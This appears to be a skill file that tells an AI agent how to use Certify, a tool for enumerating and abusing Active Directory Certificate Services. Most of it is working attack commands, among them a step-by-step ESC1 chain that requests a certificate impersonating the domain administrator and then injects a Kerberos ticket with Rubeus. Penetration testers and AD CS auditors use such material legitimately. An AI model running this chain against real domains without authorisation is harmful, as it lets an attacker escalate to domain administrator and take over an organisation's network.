---
name: certify
description: >
  This skill should be used when the user asks about "certify", "auditing AD
  CS, escalating privileges by requesting certs for alternate UPNs", "mapping
  ADCS attack surface before exploitation". Certify (GhostPack): AD
  Certificate Services enumeration and abuse tool for detecting ESC1-ESC8
  template misconfigurations.
---

# Certify

AD CS misconfiguration enumeration and exploitation.

## Quick Start

```
Certify.exe find /vulnerable
Certify.exe find
Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnerableTemplate /altname:administrator
```

## Core Commands

| Command | Purpose |
|---------|---------|
| `find` | Enumerate all cert templates |
| `find /vulnerable` | Show ESC1-ESC8 misconfigs |
| `find /enrolleeSuppliesSubject` | ESC1 candidates |
| `request /ca: /template:` | Request a certificate |
| `request /altname:<user>` | ESC1 — request with alternate UPN |
| `download /ca: /id:<n>` | Download pending certificate |

## ESC1 Full Attack Chain

```
1. Certify.exe find /vulnerable
2. Certify.exe request /ca:CA\CA-NAME /template:Template /altname:domain\administrator
3. openssl pkcs12 -in cert.pem -keyex -export -out cert.pfx
4. Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pass /ptt
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | ESC2-ESC8 exploitation, certipy cross-platform alternative |
